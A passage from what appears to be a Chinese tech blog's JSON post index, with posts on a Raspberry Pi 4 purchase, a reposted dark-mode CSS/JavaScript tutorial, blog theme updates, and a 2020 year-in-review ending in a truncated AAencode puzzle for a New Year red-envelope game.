文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) 